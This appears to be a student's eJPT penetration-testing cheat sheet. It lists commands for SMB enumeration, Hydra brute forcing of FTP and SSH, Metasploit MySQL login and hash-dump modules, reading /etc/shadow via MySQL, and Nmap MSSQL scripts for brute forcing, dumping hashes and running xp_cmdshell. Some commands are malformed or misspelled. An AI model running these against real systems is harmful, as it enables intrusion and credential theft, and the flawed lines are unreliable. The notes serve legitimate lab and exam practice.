# EJPT
##Notes and commands cheat sheet for the EJPT##


**SMBMap**

```smbmap -u "(username)" -p "(password)" -H "(IP address)```

Downloading file using SMB Map

```smbmap -u administrator -p smbserver_771 -H 10.4.244.255 --download "c$\flag.txt```

**Brute forcing FTP using Hydra
**
```hydra -L (Username list) -P (Password list) (IP Address) ftp```

**SSH - Getting SSH host key using Nmap
**
```nmap (IPaddress) -p 22 --script-args ssh_hostkey=full```
Save the host key for later

**Brute Forcing SSH with Hydra
**
```hydra -L (username) -P (password list) (IP address) ssh```

**Brute Forcing SSH login with Metasploit
**
```Use ssh/ssh_login```

**MYSQL**

Logging into Mysql on remote host

```mysql -h (IP address) -u root```

Using database

```show databases ---then type semicolon```

```use (database name);```

```select count(*) from authors;```

```select * from authors```

Finding Writable directories

Metasploit -- scanner/mysql/mysql_writable_dirs

Finding hashes

```use auxiliary/scanner/mysql/mysql_hashdump```

Getting the full etc/shadow file

```select load_file("/etc/shadow");```

Dictionary attack against Mysql

Use Metasploit -- auxiliary/scanner/mysql/mysql_login

Password File -- /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

**MSSQL**

Nmap scripts

```nmap (ip address) -p (port number) --script ms-sql-info```

```nmap (ip address) -p (port number) --script ms-sql-ntlm-info --script-args mssql.instance-port=1433```

```nmap (ip address) -p (port number) --script ms-sql-brute --script-args userdb=/root/Dessktop/wordlist/common_users.txt,passdb=/root/Dekstop/wordlist/100-common-passwords.txt```

```nmap (ip address) -p (port number) --script ms-empty-password```

```nmap (ip address) -p (port number) --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt```

```nmap (ip address) -p (port number) --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria```

```nmap (ip address) -p (port number) --script ms-sql-xp-cmdshell.cmd="type c:\flag.txt ```


**RPCClient
**
```rpcclient -U "" -N 192.168.0.0```
Useful commanands within
Enumdomusers
Lookupnames -- example lookupnames admin
